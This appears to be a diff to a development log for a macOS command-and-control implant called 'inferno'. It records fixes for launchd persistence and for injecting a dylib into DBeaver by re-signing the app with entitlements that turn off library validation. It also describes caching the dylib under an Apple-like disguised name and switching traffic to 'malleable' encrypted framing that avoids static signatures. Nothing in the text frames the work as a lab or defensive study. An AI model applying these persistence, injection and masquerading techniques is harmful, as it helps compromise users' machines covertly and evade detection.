@@ -1158,3 +1158,45 @@ using 3 rotating layout variants, authenticated via AES-GCM.
 | `test_malleable_no_static_magic` | 100 packets have 100 different first 4 bytes |
 | `test_malleable_wrong_key_rejected` | Wrong session key → deserialize returns `nullopt` |
 | `test_malleable_legacy_fallback` | Legacy `0xDEADBEEF` still accepted |
+
+---
+
+## 🛠️ Phase 8: Post-Integration Bug Fixes — Persistence & Injection — [2026-07-11]
+
+**Objective**: Fix agent persistence after reboot, DBeaver injection via MachInjector, and a critical malleable C2 receive-buffer deadlock caused by legacy-format packets.
+
+### Bug Fixes Log
+
+| # | Symptom | Root Cause | Fix |
+|---|---|---|---|
+| 1 | Agent doesn't auto-start after reboot | `launchctl load` deprecated on macOS 15.6; `persistInjectedAgent()` overwrote the standalone plist with an injected-agent plist (DYLD_INSERT_LIBRARIES) even when running standalone | Replaced `launchctl load` with `launchctl bootstrap gui/$UID` in both `installPersistence()` and `persistInjectedAgent()`. Added early return in `persistInjectedAgent()` when `DYLD_INSERT_LIBRARIES` env var is not set (standalone agent). Files: `client/src/Agent.cpp` |
+| 2 | Wrong file copied to dylib cache path | `dladdr()` in standalone agent returns the agent binary path, not the dylib path. `persistInjectedAgent()` copied the agent binary (or test binary) to `~/.cache/com.apple.amp.itmstransporter.dylib`, so DYLD tried to load an executable as a shared library | Added `.dylib` suffix validation on `dladdr()` results. Moved dylib copy before plist write in `persistInjectedAgent()`. Added fallback to copy from agent's directory (`<agent_dir>/libinferno_agent.dylib`). Files: `client/src/Agent.cpp` |
+| 3 | DBeaver injection: "Inject" sent but DBeaver doesn't relaunch | `codesign --remove-signature` left DBeaver's binary unsigned, and macOS refused to launch it via `execv` (missing ad-hoc signature). Even when it did launch, DYLD_INSERT_LIBRARIES was blocked by hardened runtime | Replaced `codesign --remove-signature` with `codesign -f -s - --entitlements <plist>` that re-signs the binary ad-hoc with `com.apple.security.cs.allow-dyld-environment-variables` + `com.apple.security.cs.disable-library-validation` entitlements. Files: `client/src/MachInjector.cpp` |
+| 4 | EntitlementScanner reports ad-hoc signed binaries as non-injectable | `classifyEntitlements()` treated non-XML `codesign` output (ad-hoc signed, no entitlements) as NONE, but the MachInjector can now re-sign these binaries with DYLD entitlement | Changed to return `DYLD_INSERT_LIBRARIES` for all unsigned/ad-hoc binaries (injector handles re-sign). Full-signed binaries without DYLD entitlement still return NONE. Files: `client/src/EntitlementScanner.cpp` |
+| 5 | Agent stops dispatching packets after initial SYS_REQ_INFO | Server sent PING, PROC_LIST_REQ, and CMD_EXEC via `sendData()` (legacy format with `0xDEADBEEF` magic). The agent only expects malleable C2 format after the handshake, so legacy packets jammed the sliding buffer — no further packets (including INJECT) were ever processed | Replaced all post-handshake `sendData()` calls with `sendPacket()` (malleable format) on the server: PING heartbeat, PROC_LIST_REQ response, CMD_EXEC. Files: `server/src/network/server.cpp` |
+
+### Architecture Note — Malleable C2 Format Exclusivity
+
+After the 64-byte greeting + session key handshake, **all** packets must use the malleable C2 framing (per-packet XOR mask + AES-256-GCM). The legacy `0xDEADBEEF` format is only valid before the handshake. Any server code that sends a legacy-format packet after the session is established will permanently desync the agent's receive buffer, because malleable `Packet::deserialize()` cannot parse non-malleable headers and the `0xDEADBEEF` resync path just blocks on the legacy magic marker.
+
+### Verification
+
+- All **36 unit tests** pass.
+- Manual injection into DBeaver.app works: binary re-signed with DYLD entitlement, dylib loaded via constructor, second agent connection appears in C2 dashboard.
+- Persistence plist confirmed as standalone format, loaded by launchd (`com.inferno.agent => enabled`).
+- DBeaver injection persistence: plist correctly overwritten with `DYLD_INSERT_LIBRARIES` pointing to cached dylib at `~/.cache/com.apple.amp.itmstransporter.dylib`. After reboot, launchd launches DBeaver directly with injected dylib.
+
+---
+
+## 🐛 Bugfix: Test overwrites production launchd plist — [2026-07-11]
+
+**Symptom**: After reboot, DBeaver doesn't launch and no agent connects. The launchd plist at `~/Library/LaunchAgents/com.inferno.agent.plist` points to `/Applications/Discord.app/Contents/MacOS/Discord` (not installed) with server `192.168.1.100:4444` (wrong IP/port).
+
+**Root Cause**: `tests/self_delete_test.cpp:test_injected_persistence_macos()` hardcoded Discord path and test server config, then called `persistInjectedAgent()` which writes to the **real** plist path. Running the test overwrote the production DBeaver-targeting plist with a broken Discord one.
+
+**Fix**:
+1. **Test isolation**: `test_injected_persistence_macos()` now overrides `HOME` to a temp directory (`/tmp/inferno_test_home_<pid>`), writes/reads the plist there, then restores `HOME` and cleans up. The production plist is never touched.
+2. **Realistic test values**: Changed test target from `/Applications/Discord.app/Contents/MacOS/Discord` to `/Applications/DBeaver.app/Contents/MacOS/dbeaver`, server from `192.168.1.100:4444` to `127.0.0.1:4242`.
+3. **Production plist corrected**: Rewrote the plist to target DBeaver at `127.0.0.1:4242` (matching the running server) instead of Discord at `192.168.1.100:4444`.
+
+Files: `tests/self_delete_test.cpp`, `~/Library/LaunchAgents/com.inferno.agent.plist`
